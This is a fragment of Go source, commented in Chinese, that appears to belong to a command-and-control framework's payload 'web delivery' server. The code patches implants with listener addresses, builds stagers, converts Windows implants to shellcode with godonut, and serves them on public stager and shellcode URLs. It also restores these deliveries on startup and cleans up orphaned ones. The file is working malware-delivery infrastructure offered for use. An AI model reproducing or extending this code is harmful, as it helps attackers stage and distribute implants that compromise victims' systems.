	var logs []database.DeliveryAccessLog
	var filterID int64
	if idStr != "" {
		filterID, _ = strconv.ParseInt(idStr, 10, 64)
	}
	logs, _ = database.DeliveryLogs().Page(limit, filterID, key)
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": logs})
}

// RestoreWebDeliveriesOnStartup 启动时恢复 status=1 的 shared/dedicated 投递
func RestoreWebDeliveriesOnStartup() {
	var list []database.WebDelivery
	list, err := database.Deliveries().ListOpen()
	if err != nil {
		return
	}
	for _, meta := range list {
		if meta.BindMode == "" {
			if strings.HasPrefix(meta.ListeningPort, "shared") {
				meta.BindMode = "shared"
			} else if meta.ListeningPort != "" && meta.ListeningPort != "0" {
				meta.BindMode = "dedicated"
			} else {
				meta.BindMode = "shared"
			}
		}
		delivery.EnsureMetaDefaults(&meta)
		delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())
		patched, _, err := loadAndPatchClient(meta.ListenerConfig, meta.OS, meta.Arch, meta.Pass, inferPayloadFormat(meta.FileName))
		if err != nil {
			// 【修复】恢复失败时自动清理失效投递：
			// 若关联监听器已从前端删除（DB 残留），删除投递记录避免每次启动重复报错刷屏；
			// 若监听器仍存在但模板不匹配（旧模板），禁用记录等待重建
			cleanupResult := cleanupOrphanDelivery(&meta)
			logx.Infof("[WebDelivery] 恢复失败 %s: %v（%s）\n", meta.PublicKey, err, cleanupResult)
			continue
		}
		payload, err := delivery.BuildPayload(meta, patched, false)
		if err != nil {
			continue
		}
		if stagerBin, err := delivery.RebuildStagerForURL(meta, delivery.StagerDownloadURL(meta)); err == nil {
			payload.Stager = stagerBin
		}
		if len(payload.Shellcode) == 0 && meta.OS == "windows" {
			if sc, err := godonut.GenShellcode(patched, meta.Pass, meta.Arch); err == nil {
				payload.Shellcode = sc
			}
		}
		if meta.CryptoMode == "aead" && (len(payload.Stager) == 0 ||
			(strings.EqualFold(meta.OS, "windows") && len(payload.Shellcode) == 0)) {
			logx.Infof("[WebDelivery] AEAD 恢复跳过 %s: Stager/shellcode 构建失败\n", meta.PublicKey)
			continue
		}
		delivery.GlobalHub.Register(meta, payload)
		if meta.BindMode == "dedicated" && meta.ListeningPort != "" && !strings.HasPrefix(meta.ListeningPort, "shared") {
			_ = startDedicatedServer(meta, payload)
		}
		logx.Infof("[WebDelivery] 已恢复投递 key=%s mode=%s\n", meta.PublicKey, meta.BindMode)
	}
}

// cleanupOrphanDelivery 恢复投递失败时的自动清理：
// 关联监听器已删除 → 删除投递记录；监听器仍在但模板不匹配 → 禁用记录（status=0）
func cleanupOrphanDelivery(meta *database.WebDelivery) string {
	// 解析 ListenerConfig（格式 protocol://address）
	listenerType := ""
	listenerAddr := ""
	if parts := strings.SplitN(meta.ListenerConfig, "://", 2); len(parts) == 2 {
		listenerType = strings.ToLower(parts[0])
		listenerAddr = parts[1]
	}

	if listenerType != "" && listenerAddr != "" {
		// 监听器存在性检查：connect_address 或 listen_address（含 0.0.0.0/:port 变体）
		exists, _ := database.Listeners().ExistsByTypeAndAddrVariants(listenerType, listenerAddr)
		if !exists {
			// 监听器已删除：删除残留投递记录（一次性清理）
			affected, _ := database.Deliveries().DeleteByPublicKey(meta.PublicKey)
			if affected > 0 {
				return "关联监听器已删除，已自动清理残留投递记录"
			}
			return "关联监听器已删除，清理失败"
		}
	}

	// 监听器仍存在但模板不匹配（旧模板）：禁用投递，避免每次启动重复失败
	_, err := database.Deliveries().SetStatusByKey(meta.PublicKey, 0)
	if err == nil {
		return "模板与当前代码不匹配，已禁用（可删除后重新创建投递）"
	}
	return "模板不匹配，禁用失败: " + err.Error()
}

// Keep encrypt import used (key path may use in future); silence if unused after refactor
var _ = encrypt.EncodeBase64

// GetDeliveryDefaults 返回全局 delivery（CDN/HTTPS）默认配置，供前端表单预填
func GetDeliveryDefaults(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": delivery.GetDefaultsView()})
}

// PreviewDeliveryURLs 根据表单预览最终公开 URL（不落库）
func PreviewDeliveryURLs(c *gin.Context) {
	var req struct {
		Listener     string `json:"listener"`
		OS           string `json:"os"`
		FileName     string `json:"filename"`
		BindMode     string `json:"bindMode"`
		Port         string `json:"port"`
		PublicHost   string `json:"publicHost"`
		PublicScheme string `json:"publicScheme"`
		BasePath     string `json:"basePath"`
		URIPath      string `json:"uriPath"`
		PublicKey    string `json:"publicKey"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
		return
	}
	req.Listener = resolveListenerAddress(req.Listener, "connect")
	meta := database.WebDelivery{
		ListenerConfig: req.Listener,
		OS:             req.OS,
		FileName:       req.FileName,
		BindMode:       req.BindMode,
		ListeningPort:  req.Port,
		PublicHost:     req.PublicHost,
		PublicScheme:   req.PublicScheme,
		BasePath:       req.BasePath,
		URIPath:        strings.Trim(req.URIPath, "/"),
		PublicKey:      req.PublicKey,
	}
	if meta.PublicKey == "" {
		meta.PublicKey = "preview"
	}
	if meta.BindMode == "" {
		meta.BindMode = "shared"
	}
	delivery.EnsureMetaDefaults(&meta)
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{
		"full":      meta.ServerAddress,
		"stager":    meta.StagerURL,
		"shellcode": meta.ShellcodeURL,
		"scheme_host_path": gin.H{
			"publicHost":   meta.PublicHost,
			"publicScheme": meta.PublicScheme,
			"basePath":     meta.BasePath,
			"uriPath":      meta.URIPath,
		},
	}})
}

// CloseAllWebDeliveryServers 优雅关闭所有 dedicated 投递服务器（进程退出时调用）
func CloseAllWebDeliveryServers() {
	Mutex.Lock()
	defer Mutex.Unlock()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	for port, srv := range WebDeliveryServer {
		if srv != nil {
			if err := srv.Shutdown(ctx); err != nil {
				logx.Infof("[WebDelivery] 关闭端口 %s 失败: %v\n", port, err)
			}
		}
		delete(WebDeliveryServer, port)
	}
}

// validateDeliveryFileName 校验交付文件名（J9: 仅允许常规文件名，防 ServeMux 模式注入）
func validateDeliveryFileName(name string) error {
	if name == "" || len(name) > 128 {
		return fmt.Errorf("交付文件名非法")
	}
	// 这些名字会被 dedicated mux 注册成独立路由，重复会 panic
	switch strings.ToLower(name) {
	case "d", "stager", "sc":
		return fmt.Errorf("交付文件名不能使用保留名: %s", name)
	}
	for _, r := range name {
		if !(r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' || r >= '0' && r <= '9' ||
			r == '.' || r == '_' || r == '-') {
			return fmt.Errorf("交付文件名包含非法字符: %q", r)
		}
	}
	if strings.Contains(name, "..") {
		return fmt.Errorf("交付文件名非法")
	}
	return nil
}
